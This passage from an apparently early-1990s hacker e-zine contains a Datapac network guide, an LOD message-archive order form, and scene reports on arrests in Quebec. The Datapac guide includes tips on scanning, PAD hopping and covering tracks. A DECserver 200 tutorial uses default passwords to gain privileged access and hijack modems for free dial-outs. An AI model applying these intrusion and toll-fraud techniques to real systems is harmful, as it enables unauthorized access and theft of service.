more than one prefix in the phone directories. The last four digits
are arbitrary, and correspond to the host number.

    An address with ten numbers as opposed to eight (ie: xxxx xxxx xx) is
utilizing a subaddress.  Quite often these machines will be independent
of a cluster of nodes and there only to fulfill one task. Also they
may simply be segregated machines for no apparent reason at all
(except to make scans a bitch :&gt;). Quite often you will find that
subsystems work as a PAD or PAC allowing you re-enter the Dpac from
a host level, therefore allowing you to make use of the company&#039;s
inherent NUI and connect to other places on the Dpac that disallow
collect calls.


                 Connecting to Machines on the Dpac

    Datapac, like most networks, uses NUIs (Network User ID) which
keep accounting for all billed connections.  HOWEVER a great deal of
machines on the Dpac allow for collect calls from within the network.
Yet if you have a valid NUI you may connect to ANY machine hooked up
to the Dpac (except those which are part of a closed user group).
I have found that it is best to PAD hop and avoid the whole NUI
problem entirely.  The following a list of connection messages
and their explanations for inter-network calls.

MESSAGE                         EXPLANATION
-------                         -----------
Call connected to: XXXXXXXX     A virtual circuit has been established
                                between an originating DTE and a remote
                                (receiving) DTE.

Hunted                          The remote logical channel is part of
                                a hunt group.

Backed Up                       The call attempt to the remote DTE has failed.
                                The network has re-directed the call to
                                another predetermined DTE that has been
                                optioned as backup.

I                               The call has been placed to an international
                                address.

P                               Priority service.  Packet size: 128.

N                               Normal service.  Packet size: 128 or 256.

DNA                             Data Network Address of the originating DTE.

LCN                             Logical Channel Number of the recipient DTE.

NUI                             The call will be billed to the 6 to 8
                                character Network User Identifier.

CUG                             The recipient DTE is part of a closed user
                                group.

Reverse Charge                  The recipient DTE has accepted the charge
                                associated With the established call.

    These reactions apply to any calls made that are not &quot;international&quot;
I will list the connect reactions for international calls in the following
section.

 DATAPAC INTERNATIONAL ACCESS PROCEDURES
 ---------------------------------------

    Datapac International provides outgoing and incoming access to 6 U.S.
based Networks and to over 100 packet-switched networks around the world.
To successfully complete such calls, Datapac has implemented the International
CCITT X.75 procedures and X.121 International numbering plan.  Thus, the
Datapac user originating an international call must use the following format:

                                           (1) (DNIC) (FOREIGN ADDRESS)
                                            :     :          :
      One defines the Datapac International.:     :          :
      Prefix.                                     :          :
                                                  :          :
      Packet networks are identified by a ........:          :
      four digit number called a DNIC                        :
      (data network identification code)                     :
                                                             :
      The foreign national address is .......................:
      expressed as an eight to ten digit
      address.

Here is a list of useful DNIC&#039;s if you get the urge to scan &quot;other&quot; networks.

    Sprintnet         3110
    Bell South        3143
    Centel            3148
    BT Tymnet         3106
    Accunet           3134
    NYNEX             3144
    U.S. West         3147
    ADP Autonet       3126
    Fedex             3138
    Express           3139

    If you are scanning (which I assume you might be) you will encounter a
great many cryptic messages.  So many, in fact, I am sure you will loose
count.  Some are worth mentioning some are not but here a few you might
encounter.

   CALL CLEARED --     A network problem within Datapac
   TEMPORARY NETWORK   or a foreign network prevents either
   PROBLEM (XXY)       the requested call from being established
                       or the established call from being
                       continued.  Try again later.

  CALL CLEARED --     Either the foreign network requested is not
  ADDRESS NOT IN      accessible from Datapac, or the foreign
  SERVICE (XXY)       network address specified identifies a
                      non-existent destination, i.e., the address is
                      not yet assigned or no longer assigned.
                      Verify with destination that the foreign
                      network is accessible from Datapac and that
                      the foreign network address is assigned.

 CALL CLEARED --      The calling terminal is not permitted to
 ACCESS BARRED        establish an international call to the
 (XXY)                called destination address because of a
                      closed user group violation.  Verify
                      network address with destination.

  CALL CLEARED --     Either the foreign network or the
  COLLECT CALL        destination address is not willing to
  REFUSED (XXY)       accept the collect calls.  Verify the call
                      establishment procedures with destination.

  CALL CLEARED --     The Call Request is considered invalid
  INCOMPATIBLE        by the foreign network mainly because of
  CALL OPTIONS        the incorrect number of digits in the
  (XXY)               foreign network address.  Verify foreign
                      network address with destination.

  CALL CLEARED --     The destination is out of order, possibly
  DESTINATION NOT     because the destination&#039;s network access
  RESPONDING (XXY)    link is inoperative.  Try again later
                      and verify with destination.

  CALL CLEARED --     The destination address called is fully
  DESTINATION BUSY    engaged (no logical channels available)
  (XXY)               and cannot accept another call at this
                      time.  Try again later.

  CALL CLEARED --     This message indicates a protocol error at
  REMOTE PROCEDURE    the remote DTE interface.  Check with remote
  ERROR (XXY)         DTE  (destination).


                      Outdials on Dpac

    On most Dpac dialups there are also dialouts, however to use them you
must either be calling from a Host on the Dpac or have a public access
NUI.  The latter tends to be more difficult to get than the former.  A list of
addresses for dialouts is available at 9210 0086 (the Datapac help
center), however it is OLD and therefore somewhat inaccurate so I have
not included it.  Also you will find that a majority of the dialouts
are of the low baud rate variety, however there are a few 19.2
dialouts as well.

    While dialouts are quite often a pain in the ass to access, all hope is
not lost.  Many of the machines you encounter on Dpac are LATservers,
Gandalfs, System/370s, etc. with dialouts.  I have found more
than a few that are COMPLETELY un-passworded with Global access
dialouts.

    Beyond all this, Dpac can also be very useful for covering your
tracks while attempting to perform digital voyeurism on other networks
like Sprintnet, Tymnet, etc.  It may mean that you have less leeway but it
still makes the target site go through a bit more difficulty in tracking
you down.

    In closing this, I am leaving a scan through which you can get familiar
with Dpac.  It is far from complete as a guide to Datapac, but lists
many of the systems I have found that accept collect calls.
I will first list prefixes and the areas they represent.

    If you are looking a decent Datapac Scanner you can get one at
403-283-5519, while this is not a public system, it will allow guest
users to log on and transfer a scanner made for Procomm for Windows

               -- An Introduction to the DECserver 200 --
                     by Opticon The Disassembled


 ANARCHY: &quot;The belief that society
 can be maintained without prisons,
 armies, police or other organized force to
 maintain property rights, collect taxes or
 enforce such personal obligations as debts,
 contracts or alimony.&quot; -EB 1966, vol.I
 (taken from the Phrozen Realm)


 &quot;If ur good, nobody knows that ur there&quot;

    The DECserver is a terminal server (WOW!).  The Model 200 is the most
commonly found server in VMS machines.  This device connects up to eight
asynchronous (RS232C) terminals to one or more hosts available on an Ethernet
Local Area Network.

    It is connected to the LAN through an Ethernet physical channel and
supports speeds up to 19.200bps.  It can be found on VAXes, mVAXes and
VAXstations.  It uses the Local Area Transport protocol to communicate with
the other nodes.  It also implements the Terminal Device/Session Management
Protocol to achieve multiple sessions.  Things that can be found plugged on
it include dial-in and out modems, terminals, printers and stuff like that.
The identification code for it in VMS is DS2.  It&#039;s software is installed
via VMSINSTAL.COM to SYS$SYSROOT:[DECSERVER] or in SYS$COMMON:[DECSERVER]
for the cluster machines.  And of course now you will ask why should you
be interested in a damn phucking (=relief, back to my native language) SERVER.
A lot of interesting things can be done, like dialing out for free (assuming
you can connect to it in a convenient way).  You can even find a DEC server
200 dedicated to eight high speed modems.  There is no need to say that you
need privileges to phuck up with devices like that...or there is?

..Set Default to SYS$SYSROOT:[DECSERVER] and run DSVCONFIG.COM :

$
$ set default sys$sysroot:[decserver]
$ show default
  SYS$SYSROOT:[DECSERVER]
  =   SYS$SYSROOT:[DECSERVER]
  =   SYS$COMMON:[DECSERVER]
$ @dsvconfig

    You must assign a unique DECnet node name and DECnet node
address for each new DECserver.

Press &lt;RET&gt; to start, or &lt;CTRL/Z&gt; to exit...

(Press RETURN for menu)

Connecting to one of them:

$ mc ncp connect node iris

Console connected (press CTRL/D when finished)
#


     Here you must give a password.  The default one is usually working so try
&quot;access&quot;.  Only in &quot;high security&quot; systems they change the default password,
because privileges are needed anyway to access the Network Control Program
(which can be a possible subject for my next article).  But since you are in
using a system account (..privileged) you can change the current password if
you find any good reason for doing so.  More on that later.

Please type HELP if you need assistance

Enter username&gt; &lt;type anything here it doesnt really matter&gt;


 You are in.

    In the DECserver there are Permanent and Operational databases.  The
permanent database holds commands which affect the device permanently when
you log out.  In the Operational database whatever you do is temporary and
takes effect only for the time you are logged in.

    Let&#039;s go on by trying to get the default privileged account which enables
you to view various things and make changes other than the normal ones.

    Again the default password should work.

** Before proceeding lets have a better look at some Features DECserver 200
has, needed to understand some interesting things which follow or even some
things that were previously mentioned.

    Remote Console Facility (RCF) is a management tool which helps you to
connect remotely to any server available via it&#039;s management port.  This
is not hardware, but a logical port although it still has the same
characteristics physical ports have.

    There are Privileged, non-Privileged and Secured ports.  These are
variables you can define by the time you manage to get the privileged account.
A privileged port accepts all server commands.  You can perform tests, define
server operations, maintain security and all that bullshit.  If you don&#039;t
understand it yet, this status is enabled with the SET PRIVILEGED command we
have used previously.

    A non-Privileged port can only manage and use commands which affect the
sessions that are currently connected to a host or node.  This is the default
status of course.

    A Secured port is something in between.  Users can make use of a restricted
command set to make changes which affect only the port they own (&quot;Property
is theft but theft is property too, Prounton.&quot;  Pardon me if the translation
was destructive to the original meaning of this phrase, and if I piss you off
every time I start talking about things that are completely irrelevant
to the grand scheme of things and everything my articles are SUPPOSED
to deal with).

    Our little unit has 5 types of passwords and that will help you understand
how important it is for the whole system.

    (1) A PRIVILEGED password is what you should be aware of by now.  You can
SET/DEFINE SERVER PRIVILEGED PASSWORD &quot;string&quot;, to change it.

    (2) A LOGIN password prevents the use of the server by unauthorized
users.  This can be enabled for every port or for a single dial-in modem port.
You must first specify the password for the entire server via SET/DEFINE
SERVER LOGIN PASSWORD and then, enable or disable it depending on the needs
of a specified port, via SET/DEFINE PORT x LOGIN PASSWORD ENABLED/DISABLED.
This password takes effect when you try to login to a port.  The prompt is
a &quot;#&quot; sign, without the double quotes.

    (3) A MAINTENANCE password prevents unauthorized users from doing remote
maintenance operations like the one we did after we ran DSVCONFIG.COM.
&quot;The DECnet service password corresponds to the server maintenance password
and it is entirely unrelated with the DECserver 200 service password&quot;.  In
other words someone who wishes to modify a value in your server must give
in the NCP&gt; command line, a parameter which specifies your server&#039;s
maintenance password.  Of course if this password is set to null (0)
no password is needed.  Also &quot;Digital Equipment Corporation recommends
against storing the password in the DECnet database (as the DECnet service
password) and it strongly suggests that you change the maintenance password
from the default value of 0 to maintain adequate server security&quot;
...tsk tsk tsk...

    (4) A SERVICE password protects a service or services defined on the
server.  You can increase or decrease the number of attempts before the server
gives a message, informing that the connect has failed because of an invalid
password, via SET/DEFINE SERVER PASSWORD LIMIT.

    (5) A LOCK password protects your current sessions and port from other
unwanted human substances.  The server accepts no input until you retype the
password you used for locking it.

    Finally, a port may be available only for certain users or groups.

** As you can see, it can be really tough to break VMS&#039; security if all the
available measures are taken.

Research for modems:

Local&gt; show port 8

    Simple configuration, probably nothing or a terminal in there.  What this
screen says is that we have on server IRIS, on port 8, something with character
size of 8, flow control XON (it could be CTS -hardware-), parity none, input
speed 19200bps, output speed 19200bps and modem control disabled.

    All the other information have to do with the server and how it reacts to
certain things.  So if the preferred service was &quot;VMS&quot; and you were logging in
through port 8, you would immediately connect to the VAX without having the
server asking you where to log you to.  The &quot;break: Local&quot; variable means that
if you send a break character you will find yourself in the &quot;Local&gt;&quot; prompt even
if you have been working in the UNIX OS of the &quot;UNIX&quot; host and that lets you
start multiple sessions.  Quite useful.  The forward and backward switches are
for moving around your sessions.  Everything can be modified.

    For more information concerning the parameters have a look at the command
reference or the help utility.

    And that&#039;s, obviously, a modem.  The speed, the modem control and the enabled
characteristics will help you understand even if the name is not helping at
all.  Have a look at the &quot;Alternative Speed&quot; option.

    What to do now that you have find it?

Local&gt; set port 1 modem control disabled
Local&gt; set service modem port 1
Local&gt; connect modem


    Start programming.  This way is a little bit awkward and of course there
is a possibility that the modem is ALREADY defined as a dial-out modem.  You
are a privileged user, don&#039;t forget that.  I would recommend not to harm the
server (&quot;nothing comes from violence and nothing ever good&quot;) and to leave
things as u find them.  DO NOT create a permanent dial-out modem service
(which can be done directly from VMS if you really want to) and DO NOT
forget that somebody has to pay for your calls and that the line which
the modem uses, may be limited to certain numbers or even prevent out-dialing
by hardware.  Use your brains...And don&#039;t stick in the idea of researching
modems.  You can use a DECserver to infiltrate a system.  Don&#039;t misuse those
introductions.

    An interesting Warning Message, just for informational purposes, is the
following;

      &quot; Local -120- WARNING - Access to service is not secure

        Session status information cannot be passed between the
        server and the attached device because modem signals are
        not present.  This is not a problem if the device is a
        non-secure printer; however, if the port is a non-LAT
        host system, users could access other users&#039; data. &quot;

    That&#039;s all for now I think.

    There are many things to explain but there is no reason for doing that right
now.  If you need more information then just have a look at the HELP utility or
contact me, somehow.  [I hope you have not misunderstood my strange looking
article because my native language is not English]


    &quot; Opticon: Don&#039;t you think that I&#039;m getting insane?
      TLA: Yeah, sure looks like it...&quot;

    Love and An-archy to all those who know why.

      The LOD Communications Underground H/P BBS Message Base Project:
             Information and Order Form File Version #2, 7/30/93
 
 
   This file contains:
 
     - Background information on the project;
     - Excerpts from Computer underground Digest (CuD) Issue #5.39;
     - UPDATED FAQ AND PRICING; and,
     - UPDATED Order form and stipulations.
 
   This is an update of Version #1 of this file.  A change in pricing
structure (to your benefit) has been made along with some additions to the
FAQ among other things. All sections that have been changed/updated are
bordered by 3 asterisks (*** ___ ***).  Please take the time to read through
the updates.  Sections without asterisks have not been changed and are
essentially the same as in Version #1. This file is approximately ten pages
in length (28K) and should answer all of your questions.
 
 
The Project:
------------
 
   Throughout history, physical objects have been preserved for posterity for
the benefit of the next generation of humans.  Cyberspace, however, isn&#039;t very
physical; data contained on floppy diskettes has a finite lifetime as does the
technology to retrieve that data.  The earliest underground hacker bulletin
board systems operated at a time when TRS-80s, Commodore 64s, and Apple ][s
were state-of-the-art.  Today, it is difficult to find anyone who has one of
these machines in operating condition, not to mention the brain cells left to
recall how to operate them. :-(
 
   LOD Communications has created a historical library of the &quot;dark&quot; portion of
Cyberspace.  The project&#039;s goal is to acquire as much information as possible
from underground Hack/Phreak (H/P) bulletin boards that were in operation
during a decade long period, dating from the beginnings (in 1980/81 with 8BBS
and MOM:  Modem Over Manhattan) to the legendary OSUNY, Plover-NET, Legion of
Doom!, Metal Shop, etc. up through the Phoenix Project circa 1989/90. 
Currently, messages from over 50 different BBSes have been retrieved, although
very few message bases are 100% complete.  However, not having a complete &quot;set&quot;
does not diminish their value.
 
 
Who Benefits From This Information?:
------------------------------------
 
     - PARTICIPANTS who were on the various H/P BBSes may want to see their
       contribution to history or reminisce about the &quot;golden era&quot; of hacking;
 
     - ENTHUSIASTS who came into the &quot;scene&quot; after most of these boards were
       down may want to see what they missed;
 
     - COMPANIES who may want to see if their (or their competitors&#039;) phone
       systems, computers, or networks were compromised;
 
     - SECURITY PROFESSIONALS/LAW ENFORCEMENT who may want to see what
       techniques were used to subvert computer security systems;
 
     - SCHOOLS AND UNIVERSITIES (including their libraries) who may want to
       use the information for research in sociology or computer science as
       well as for educational purposes in courses such as Computer Law,
       Computer Ethics, and Computer Security;
 
     - AUTHORS/PRESS who may want to finally get the facts straight about
       &quot;hackers&quot;; and,
 
     - THE CURIOUS PUBLIC who may want to sneak a peek into the inner realm of
       the Computer Underground, especially those Restricted Access BBSes and
       their Private sub-boards where only a small handful of &quot;the best&quot;
       resided.
 
   Were the individuals involved in the Computer Underground out to start World
War III, selling secrets to the Soviets, working with organized crime,
conspiring to do evil, or just a bunch of bored teenagers with nothing better
to do?  How much did they know, and how did they find it out?  Did they have
the capability to shut down phone service of Area Code portions?  Could
they ruin someone&#039;s credit?  Could they &quot;move satellites in the heavens?&quot; 
Could they monitor packet switching network conversations or YOUR
conversations?  The answers lie within the messages themselves.
 
 
*** Why is LODCOM Charging Money For The Message Bases?: ***
------------------------------------------------------------
 
   As happens with most projects, the effort and monetary investment turned
out to be substantially more than originally anticipated.  With all of the
high-tech equipment available today, people sometimes forget that in the early
1980s, 14.4K baud modems and 250 MB hard drives were just a fantasy for the
home computer user.  Most messages Lodcom has recovered were downloaded at 300
baud onto 143K disk drives, with each file usually no larger than 15K in size. 
One could not call a BBS and download the complete message base in 10 minutes
and save it into one file.  Literally hundreds of man-hours have been spent
copying dusty Apple ][ disks, transferring them to IBM (or typing in hard
copy versions when electronic versions were unavailable), organizing over one
thousand individual files (thus far) according to what BBS the messages were
originally posted on, and splicing the files together.  Also, after consulting
with the appropriate civil liberties organizations and our own legal counsel,
a slight editing of the messages (restricted to long distance access codes,
phone numbers, and computer passwords) had to be made to ensure that there is
nothing illegal contained within the messages.  Every effort was made to keep
the messages in their pristine condition:  40 columns, ALL CAPS, spelling
errors, offensive language, inaccuracies of various kinds, and ALL.
 
   Although a fairly comprehensive collection of the goings-on during a decade
of public and private computer underground activity has been accomplished,
there are more messages out there.  It is our wish to continue to document the
History of the Computer Underground.  In order to do this, and in order to
break even on what resources have already been expended (it is a LOT more than
most people realize), a dollar value has been attached to the entire
compilation of message bases (ie, all Volumes combined).  Without your
understanding and support, this effort may not be able to sustain itself long
enough to complete the project.  A large portion of any profits will be
recycled for two other projects in the works, whose aim is to provide
additional historical background on the Computer Underground Community.  That
is, no one involved is quitting their day job :-)
 
  DONATIONS: A portion of every order will be donated to the following causes:
 
             1) A donation will be made to help pay for Craig Neidorf&#039;s
                (Knight Lightning - Metal Shop Private Co-Sysop) Legal Defense
                bills (resulting from his successful campaign to protect First
                Amendment rights for electronic publishing, i.e. the
                PHRACK/E911 case).
 
             2) The SotMESC Scholarship Fund.  The SotMESC Scholarship is
                awarded to students writing exceptional papers of 20 to 30
                pages on a topic based on computer culture (ie, hacking
                culture, virus writing culture, Internet culture, etc.) For
                more details write: SotMESC  PO BOX 573  Long Beach, MS 39560
                or email: rejones@seabass.st.usm.edu
 
 
What Each &quot;Message Base File&quot; Contains:
---------------------------------------
 
     - A two page general message explaining H/P BBS terminology and format.
 
     - The BBS Pro-Phile:  A historical background and description of the BBS
       either written by the original system operator(s) or those who actually
       called the BBS when it was in operation (it took months to track the
       appropriate people down and get them to write these specifically for
       this project; lesser known BBSes may not contain a Pro-Phile);
 
     - Messages posted to the BBS (i.e. the Message Base);
 
     - Downloaded Userlists if available; and
 
     - Hacking tutorials a.k.a. &quot;G-Philes&quot; that were on-line if available.
 
   It is anticipated that most people who are interested in the message bases
have never heard of a lot of the BBS names shown in the listing.  If you have
seen one set of messages, you have NOT seen them ALL.  Each system had a
unique personality, set of users, and each has something different to offer. 
 
 
Formats the Message Base Files are Available in:
------------------------------------------------
 
   Due to the large size of the Message Base Files, they will be compressed
using the format of your choice.  Please note that Lodcom does NOT include the
compression/uncompression program (PKZIP, PAK, etc.).  ASCII (uncompressed)
files will be provided for $5.00 extra to cover additional diskette (files
that are uncompressed require more than double the number of diskettes) and
shipping costs.  The files are available for:
 
     - IBM (5.25 or 3.5 inch)
     - AMIGA (3.5 inch)
     - APPLE MACINTOSH (3.5 inch)
     - PAPER versions can be ordered but cost triple (due to increased shipping
       costs, time to print order, and messages being in 40 column format and
       therefore wasting lots of paper...save those trees!).  Paper versions
       take twice the time to deliver but are laser printed.
 
Orders are expected to arrive at the requesters&#039; physical mail box in 3-5
weeks upon receipt of the order.
 
 
*** FAQs (Frequently Asked Questions): ***
------------------------------------------
 
  QUESTION:  In VERSION #1 of this file a minimum order size of $20.00 was
             required but I don&#039;t see that in this version.  Also all the
             individual Message Bases had a price.  Why the change?
 
   ANSWER: After disseminating the first version of this information file, we
           received a very good response as far as orders are concerned. Since
           our goal is to recoup the expenses incurred (and still incurring)
           on this project rather than &#039;fleece the masses&#039; it was decided to
           lower the overall price which translates to offering more files for
           the same old price.  That is, you will receive ALL Volumes of this
           project for $39.00 rather than just the 1st Volume as was mentioned
           in the last release of this information file. As for the minimum
           order ($20.00), since EVERYONE who has thus far ordered the Message
           Bases ordered the complete volume (was Volume #1 only, now it&#039;s all
           volumes) rather than individual message bases, we decided to do
           away with individual Message Base pricing due to lack of demand.
 
  QUESTION:  How many Volumes will Lodcom be releasing?
 
   ANSWER: Three Volumes minimum, possibly a fourth if additional material
           is obtained.  There are still a few contributors who have material 
           that hasn&#039;t been sent to us yet.  The expected release of future
           Volumes are:
 
                       Volume 1: 5700+ Messages, 20 H/P BBSes, COMPLETED.
                       Volume 2: 15-25 H/P BBSes, September 1993.
                       Volume 3: 15-25 H/P BBSes, November 1993.
                       Volume 4: If there is one, End of December 1993.
                       All in all there is expected to be 15000+ Messages.
 
  QUESTION:  How long will these Message Base Files be available?
 
   ANSWER: We cannot say for sure.  This is an ongoing effort and your support
           will allow us to continue until we are satisfied with having
           recovered the last decent scraps of messages out there.  Assuming
           there is a demand for these messages, all H/P BBSes of WORTH (i.e.
           NON-&quot;codez&quot; and NON-&quot;warez&quot; systems) are expected to be offered by
           the end of this year (1993).  A Guesstimate of what will be
           offered is 60 to 80 Message Bases, half of which will be rather
           partial.  Orders are expected to be filled at least into the
           beginning of next year (1994) although this may change. Regardless,
           we will send out notification well in advance of ceasing operations.
 
  QUESTION:  I ordered Volume #1 already, is your new pricing retroactive?
 
   ANSWER: Yes.  If you have already ordered Volume #1, when the next Volume
           is completed it will be sent out to you without any action on your
           part.  If you change mailing addresses be sure to notify us.  Think
           of this as a Subscription of sorts.  Order now and all completed
           Volumes will be sent to you.  When another Volume is finished it
           will be sent out automatically.  If it wasn&#039;t for all of you who
           have already ordered and showed your support, we would not be able
           to offer ALL the Volumes for what you paid for the first Volume.
 
  QUESTION:  What if lodcom obtains more messages from a BBS or BBSes after 
             a Volume has been shipped to me, will I get those messages also?
 
   ANSWER:  Yes. Any additional messages to a H/P BBS that we obtain after
            shipping that BBS file to you will be sent to you either via email
            or via snail mail on another diskette.
 
  QUESTION:  I would really like to get a feel for what a few of the
             boards were like before I order them.  Can I get more info?
 
   ANSWER: Yes.  A Sample of actual messages is available by performing the
           following, so long as you have TELNET access to the Internet:
 
           Telnet to:  phantom.com  (or)  198.67.3.2
           Type:       mindvox         [To enter the Mindvox system]
           login as:   guest           [To look around]
           At prompt:  finger lodcom   [To see our Sample Messages File]
 
   If you do not have TELNET access to the Internet, AND your host will NOT
&quot;bounce&quot; a 50K file, Lodcom will send you the Sample Messages File if you
specifically request it. The file has 31 fairly typical messages from Five
H/P BBSes that operated between 1983 and 1989.
 
  QUESTION:  &quot;Can I help out?  I have some old messages&quot; (either on a C64,
             Apple, IBM [best for us], or printout).
 
   ANSWER: Contact us ASAP!  We will work out an equitable agreement depending
           on the quantity, quality, format, and &quot;ancientness&quot; of the
           messages.  Your contribution will not go unrecognized.
 
  QUESTION:  I would like another person&#039;s point of view on this project
             before I decide to order.  Where can I get more information?
 
   ANSWER: See the following excerpt from Cud #5.39.  We also list where you
           can get the original CuD issue which also includes an interview and
           some BBS Pro-philes.

*** {The following excerpts are from CuD #5.39 File 1, CuD&#039;s Critique} ***
 
&quot;...Lest there be any confusion, there remains only one LOD, most of its
original members are in periodic contact, they have long since become
adults, and there is no relationship between the original LOD and any
recent individuals or groups claiming the name.
 
But who really cares??
 
CuD, for one cares. The original LOD remains a cultural icon of the
1980s in computer culture, and--for better or worse--it was the most
influential and imitated group whose mystique continues into the
mid-90s. This alone is hardly sufficient reason to worry about a
label. The identity is important because the original members are
becoming involved in projects that reflects their activities of a
decade ago, and it becomes confusing when others scurry about trying
to associate with that identity.  If questions of identity arise,
confusion over and doubts about the credibility of the projects arise.
 
One current LOD project has impressed us. The original LOD members are
compiling logs from a number of the premier &quot;hacker underground BBSes&quot;
of the 1980s.  We have obtained excerpts from the project, and we are
impressed with the professionalism and comprehensiveness of the material.
 
Working collectively under the name &quot;LOD Communications,&quot; former members have
scoured their archive for BBS logs from the mid-to-late 1980s. The logs
include BBSes such as OSUNY, Twilight Zone, Forgotten Realm, Black Ice
Private, Phoenix Project, Face to Face, Alliance, and Plover-NET, among
others. Many were the primary boards of the era, and others typify secondary
levels of the culture. Both singly and in the aggregate, the collection
provides an unprecedented view into a culture that most of us only read about
in &quot;Cyberpunk&quot; or &quot;The Hacker Crackdown.&quot;
 
We like the material for several reasons. First, as researchers, we find even
the limited material we have seen to date as a rich source of data for anybody
who wants to understand the culture of time. It is as if somebody had walked
though San Francisco&#039;s Haight-Ashbury district with a video-cam during the
&quot;Summer of Love&quot; and then released the tapes years later. It&#039;s an
anthropologists dream, a sociologists data trove, and a historian&#039;s archival
orgasm. Even law enforcement and security personnel would find it helpful for
demystifying many of the misconceptions of &quot;hackers.&quot; For others, it&#039;s
simply fun reading.
 
The logs are sufficiently entertaining and useful when each board is
read individually. However, the power of the collection comes in
reading them as chapters in a novel, as segments at different points
in time that combine to give the individual posters and the boards a
personality. We find ourselves wanting to know more about some of
these people: How did they resolve their problems? Who was the alleged
informant on a given board? Can we spot them from the posts? How did
that poster resolve his problems?  What happened to these people later?
 
Many of the logs&#039; posts are flattering, others are less so. To their credit,
the lodcom editors have left it all intact to let the readers see and judge
for themselves what occurred on the underground boards. The LOD collection
provides an authentic look into what went on, and reading them gave us a
feeling of deja vous all over again.&quot;

*** Hacking/Phreaking Tutorials a.k.a. &quot;G-Philes&quot;: ***
------------------------------------------------------
 
   Along with the above H/P BBS Message Bases, LODCOM has collected many of the
old &quot;philes&quot; that were written and disseminated over the years.  A list of all
of them would take up too much space here, however, we can tell you that the
majority are NOT files that were originally written for electronic newsletters
such as Phrack, PHUN, ATI, etc. (with the perhaps obvious exception of the
LOD/H Technical Journal).  Those files/newsletters are readily available from
other sources.  This hodgepodge includes files that somehow fell out of
widespread circulation.  A Table of Contents of the collection is included but
the tutorials are all grouped together in four large files of approximately
250K each. 
 
   UPDATE/ADDITION: A collection of material is being compiled from the H/P
   BBS Message Bases and Files along with other sources that is an organized
   conglomeration of all the writings of all the ex-members of the Legion of
   Doom/Hackers group. It also includes private LOD/H Group sub-board message
   bases that resided on the LOD BBS (1984), Catch-22 (1985), Phoenix Project
   (1988), and Black Ice Private (1988) that were NOT included in those BBSes&#039;
   Message Bases. BBS Messages from before and after each member entered the
   group along with any files they wrote will be organized, by member name,
   into individual files. This is being done more for ourselves than anything
   else as we are curious how much material was created over the years. Note
   that this special collection of files will be sent to you around the same
   time that Volume III is sent out and is free for ordering BOTH, the G-Phile
   Collection mentioned above, and the Message Base Files.

                             International Scenes

There was once a time when hackers were basically isolated.  It was
almost unheard of to run into hackers from countries other than the
United States.  Then in the mid 1980&#039;s thanks largely to the
existence of chat systems accessible through X.25 networks like
Altger, tchh and QSD, hackers world-wide began to run into each other.
They began to talk, trade information, and learn from each other.
Separate and diverse subcultures began to merge into one collective
scene and has brought us the hacking subculture we know today.  A
subculture that knows no borders, one whose denizens share the common goal
of liberating information from its corporate shackles.

With the incredible proliferation of the Internet around the globe, this
group is growing by leaps and bounds.  With this in mind, we want to help
further unite the communities in various countries by shedding light
onto the hacking scenes that exist there.  We have been requesting files
from people to describe the hacking scene in their country, but
unfortunately, more people volunteered than followed through (you know
who you are.)  This issue we want to introduce you to the scenes in
Quebec, Sweden and Israel.

                  What is going on in the 418 scene
                      By Gurney Halleck of NPC


        Believe it or not, there are hackers and phreakers in the 418 AC and
people are just starting to hear from us.  There are only two real H/P BBS in
Quebec City, The Workshop and Miranda BBS.  The first one is a NPC hang out
(Northern Phun Co.), a local Hacker/Phreaker group that has a certain fame,
just read Phone Pirates, a recent book by two Toronto journalists....
The other one is considered a little bit lame by some.  Personally, I am
friends with the sysops, they&#039;re not real hackers, but generally nice guys.

        Here are some names you might have seen in the H/P scene, Blizkreig,
SubHuman Punisher, KERMIT, Atreid Bevatron, Coaxial Karma, Mental Floss,
Fairy Dust, Evil-E, Black Head, Santa Claus, Blue Angel Dream, myself of course
and probably many more I have forgotten to mention.  (sorry)

        NPC Publishes a monthly magazine and will be celebrating their first
anniversary on November 1st 1993.  They have been on national TV and press for
breaking into the computer of the prime minister&#039;s cabinet.

        In 418, there is only one Internet Node, at Laval University, and to
get a legal account on one of their systems, be ready to shell out 90$ a month.
No kid can pay that much, so that&#039;s why there are so many hackers.  They hack
anything from old VAX/VMS machines to brand new Suns and Datapac and Edupac.

        Back in April of 1993, a hacker, Coaxial Karma, was arrested for trying
to &quot;brute force&quot; into saphir.ulaval.ca, a cluster VAX/VMS.  He was working from
information from another hacker, myself, that there were many &quot;virgin&quot; accounts
(account that were issued but never used) and that these accounts all had a
four letter (just letters) password.  So he proceeded to brute force the
computer, after 72000 tries, he finally got in.  An operator, entirely by
chance, found the logs for the 72000 failed logins for one account on saphir,
an proceeded to call the police.  The hacker, being a juvenile, got by easily,
not even loosing his computer.

        On September 30th, another hacker, SubHuman Punisher, was arrested
by the RCMP.  It all started a long time ago, when people started hacking
into Laval University&#039;s systems.   First, they installed a password on their
terminal servers, just one password, the same for everybody!  Needless to say,
everybody knew it.  Second, most sys-admins knew next to nothing about
security, so when they found intruders, they could not keep them out.
Enter Jocelyn Picard, sysadmin of the GEL subdomain and security expert.
He does his job and does it well.  He kicked them out for a long time.
(I personally do not think it was his idea to call the RCMP.)

        After a while, the hackers where back with a vengeance and using
Laval&#039;s systems to hack other systems.  So the guys from the CTI (Centre
de Traitement de l&#039;Information) decided to call the authorities.  Bell
monitored the phone lines from Sept 16th to Sept 30th.  Systems in the ERE
hierarchy in the umontreal.ca domain were also logged for Internet activity.
On the 30th, 2 hackers where arrested.  Both of them, their only crime
was wanting to be on the internet.  Now is that so bad?

        I only knew one of the two, SubHuman Punisher, so I&#039;ll tell you what
happened to him.  He was charged with theft of telecomunications (that charge
has been dropped) and for illegally using a computer.  A new charge as been
added after they drop the first one: copyright infringement.  All his
equipment was taken away.  We don&#039;t think he&#039;ll get by as easily as the first
electronic martyr of 418 (as we like to call him).  This time it looks serious.
So we at NPC have started a relief fund for his legal defense, The &quot;Fond de
Defense SubHuman Punisher&quot; ( the SubHuman Punisher defense fund).

                              The Swiss Scene
                                  by Holz


Welcome to Switzerland, the country that&#039;s famous for, ehmm err, well now
famous for... come to think of it....nothing really.

Well, for those of you that didn&#039;t pay much attention at high school:
Switzerland is a rather unimportant country (to anyone but the Swiss) in
the middle of Europe with about 7*10^6 inhabitants and some light industry.

Networks in Switzerland
-----------------------
Switzerland has two internet providers, SWITCH and CHUUG. Lets deal with them
in that order. SWITCH was originally formed from a consortium of the 9 (?)
or so universities in Switzerland. It&#039;s purpose was linking the universities
in Switzerland and providing access to international networks for their
researchers. SWITCH is linked to the nfsnet via CERN (the European center
for nuclear research in Geneva) and INRIA in France. SWITCH&#039;s Customers
